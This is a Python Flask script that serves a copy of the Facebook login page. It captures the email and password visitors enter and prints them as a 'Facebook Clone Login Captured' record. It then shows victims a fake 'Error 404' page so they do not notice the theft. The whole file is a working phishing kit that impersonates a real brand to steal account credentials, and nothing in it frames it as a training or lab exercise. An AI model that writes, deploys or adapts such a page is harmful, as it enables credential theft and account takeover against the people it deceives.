from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')

        print("\n🛑 Facebook Clone Login Captured")
        print(f"📛 Username: {username}")
        print(f"🔑 Password: {password}")
        print("-" * 40)

        return "<h2>Error 404.....</h2>"

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>www.facebook.com</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="/Facebook.png">

  <style>
    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Roboto", sans-serif;
    }
    .res {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      flex-direction: column;
      background: #f0f2f5;
      padding: 20px;
    }
    .fb-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
    }
    .card {
      text-align: center;
      margin-bottom: 20px;
    }
    .fb-form h1 {
      color: #1877f2;
      font-size: 4rem;
      margin-bottom: 10px;
    }
    .fb-form p {
      font-size: 1.5rem;
      text-align: center;
    }
    form {
      background: #fff;
      border-radius: 8px;
      padding: 20px;
      width: 100%;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
    }
    form input {
      height: 50px;
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 15px;
      font-size: 1rem;
      padding: 0 14px;
    }
    form input:focus {
      outline: none;
      border-color: #1877f2;
    }
    ::placeholder {
      color: #777;
    }
    .fb-submit {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    .login {
      border: none;
      background: #1877f2;
      padding: 14px 0;
      border-radius: 6px;
      color: white;
      font-size: 1.2rem;
      font-weight: 600;
      cursor: pointer;
    }
    .login:hover {
      background: #0d65d9;
    }
    .forgot {
      text-align: center;
      color: #1877f2;
      font-size: 0.9rem;
      text-decoration: none;
    }
    .forgot:hover {
      text-decoration: underline;
    }
    hr {
      border: none;
      height: 1px;
      background-color: #ccc;
      margin: 20px 0;
    }
    .button {
      text-align: center;
    }
    .button a {
      display: inline-block;
      padding: 15px 20px;
      background: #42b72a;
      border-radius: 6px;
      color: white;
      font-size: 1rem;
      font-weight: 600;
      text-decoration: none;
    }
    .button a:hover {
      background: #3ba626;
    }
    footer {
      width: 100%;
      background: #fff;
      padding: 20px;
    }
    .footer-langs {
      max-width: 1000px;
      margin: auto;
    }
    footer ol {
      display: flex;
      flex-wrap: wrap;
      list-style-type: none;
      padding: 0;
      gap: 10px;
      justify-content: center;
    }
    footer ol li {
      font-size: 12px;
      color: #8a8d91;
    }
    footer ol li a {
      text-decoration: none;
      color: #8a8d91;
    }
    footer ol li a:hover {
      text-decoration: underline;
    }
    footer small {
      display: block;
      text-align: center;
      margin-top: 10px;
      font-size: 12px;
      color: #8a8d91;
    }
    @media (max-width: 768px) {
      .fb-form h1 {
        font-size: 3rem;
      }
      .fb-form p {
        font-size: 1.2rem;
      }
      form {
        padding: 15px;
      }
      .button a {
        font-size: 0.9rem;
        padding: 12px 16px;
      }
    }
    @media (max-width: 480px) {
      .fb-form h1 {
        font-size: 2.5rem;
      }
      .fb-form p {
        font-size: 1rem;
      }
      footer ol {
        justify-content: flex-start;
      }
      .res {
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="res">
    <div class="fb-form">
      <div class="card">
        <h1>facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <form action="/" method="POST">
        <input type="text" name="email" placeholder="Email or phone number" required />
        <input type="password" name="pass" placeholder="Password" required />
        <div class="fb-submit">
          <button type="submit" class="login">Login</button>
          <a href="https://www.facebook.com" class="forgot">Forgot password?</a>
        </div>
        <hr />
        <div class="button">
          <a href="#">Create new account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>
    <div class="footer-langs">
      <ol>
        <li>English (UK)</li><li><a href="#">मराठी</a></li><li><a href="#">हिन्दी</a></li>
        <li><a href="#">اردو</a></li><li><a href="#">ગુજરાતી</a></li><li><a href="#">ಕನ್ನಡ</a></li>
        <li><a href="#">ਪੰਜਾਬੀ</a></li><li><a href="#">தமிழ்</a></li><li><a href="#">বাংলা</a></li>
        <li><a href="#">తెలుగు</a></li><li><a href="#">മലയാളം</a></li><li><button>+</button></li>
      </ol>
      <ol>
        <li><a href="#">Sign Up</a></li><li><a href="#">Log In </a></li><li><a href="#">Messenger</a></li>
        <li><a href="#">Facebook Lite</a></li><li><a href="#">Video</a></li><li><a href="#">Places</a></li>
        <li><a href="#">Games</a></li><li><a href="#">Marketplace</a></li><li><a href="#">Meta Pay</a></li>
        <li><a href="#">Meta Store</a></li><li><a href="#">Meta Quest</a></li><li><a href="#">Imagine with Meta AI</a></li>
        <li><a href="#">Instagram</a></li><li><a href="#">Threads</a></li><li><a href="#">Fundraisers</a></li>
        <li><a href="#">Services</a></li><li><a href="#">Voting Info Centre</a></li><li><a href="#">Privacy Policy</a></li>
        <li><a href="#">Privacy Centre</a></li><li><a href="#">Groups</a></li><li><a href="#">About</a></li>
        <li><a href="#">Create ad</a></li><li><a href="#">Create Page</a></li><li><a href="#">Developers</a></li>
        <li><a href="#">Careers</a></li><li><a href="#">Cookies</a></li><li><a href="#">AdChoices</a></li>
        <li><a href="#">Terms</a></li><li><a href="#">Help</a></li><li><a href="#">Contact uploading</a></li>
      </ol>
      <small>Meta © 2025</small>
    </div>
  </footer>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(debug=True)
